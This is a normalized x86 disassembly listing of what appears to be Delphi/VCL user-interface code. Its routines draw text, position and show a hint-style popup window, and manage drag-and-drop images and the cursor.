add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c90
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_442094
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_446670
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_443750
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_444914
sub_449ef0
push ebx
push esi
mov esi edx
call sub_45a2f0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443750
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443750
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_449f54
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_446a38
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_449f8c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_449f84
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_441650
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44112c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a028
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441728
test bl bl
jle r-xdata
xor eax eax
call sub_43f720
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44a068
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41de50
xor eax eax
push ebp
push sub_44a103
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41e2b4
xor eax eax
push ebp
push sub_44a0e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a0e7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41e2b4
retn
sub_44a114
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44aa4c
mov edx 0x80ffff
mov eax esi
call sub_4426f0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41e130
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41dae4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a180
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_445c10
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c4ec
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_445ba8
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44a1ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a242
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a249
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ReleaseDC
retn
sub_44a250
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44a2e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41d1d4
mov eax ebx
call sub_4448bc
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x14 ]
call sub_404554
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a2f0
lea eax [ ebp - 0x14 ]
call sub_404094
retn
sub_44a2f8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44a364
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44a3ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a3f6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_442550
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41e070
mov edx eax
add edx 0x6
mov eax esi
call sub_441d0c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442550
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41e08c
mov edx eax
add edx 0x4
mov eax esi
call sub_441d30
sub_44a3fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_44a5d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442580
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4437f4
mov eax [ esi ]
call sub_460c20
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_460c2c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_460c20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_460c14
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_460c2c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_460c08
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_460c14
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_460c08
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4464b8
push 0x4
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a5dc
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404354
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44d694
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call [ rw-data ]
sub_44a5e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44a60c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412f04
mov eax esi
call sub_4448bc
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ esi + 0x208 ]
call sub_41e234
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44a668
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412f04
call sub_436540
call sub_436620
test al al
jne r-xdata
call sub_436540
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_4369e0
push esp
push 0x1
push 0xf
push 0x0
call sub_436540
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4366e0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_44a6d4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_446dc0
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44a6f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44a750
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a810
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424ed0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424ed0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44a81c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44f970
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44a87c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4505e4
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_44a8a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44f79c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_44a750
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44a908
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44a81c
push 0x0
call ShowCursor
sub_44a908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44f79c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44a96c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44a6f8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44a96c
push ebx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_44a990
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44a6f8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44aa04
push ebx
push esi
mov esi eax
mov eax esi
call sub_44f79c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44a96c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_44a864
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44aa4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444ab0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44112c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44aaa8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444bd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44aaf8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41de50
xor eax eax
push ebp
push sub_44ab96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41e2b4
xor eax eax
push ebp
push sub_44ab73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_441144
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab7a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41e2b4
retn
sub_44aba8
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44ac3c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44abc4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44ac3c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44b234
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44ac3c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_44ac70
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44ad00
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov edx 0x2
call sub_44ad00
jmp r-xdata
retn
sub_44acb8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44ad6c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov edx 0x2
call sub_44ad6c
jmp r-xdata
retn
sub_44ad00
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44b134
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_44ad6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_44ac20
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44b134
push eax
mov eax esi
call sub_44ac70
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44b134
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44ae1c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44ac20
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44b234
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_44ad6c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_44ac20
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_44ad6c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_44ac70
mov edx eax
add edx esi
mov eax ebx
call sub_44b15c
mov edx edi
mov eax ebx
call sub_44b15c
jmp r-xdata
mov eax ebx
call sub_44afbc
mov eax ebx
call sub_44b20c
mov ebx eax
test ebx ebx
jne r-xdata
sub_44aec4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404094
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040e8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_44af08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403540
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44af79
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44329c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_44af8c
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44b20c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44afbc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44ad6c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44ad6c
mov esi eax
push ebp
call sub_44af8c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b20c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
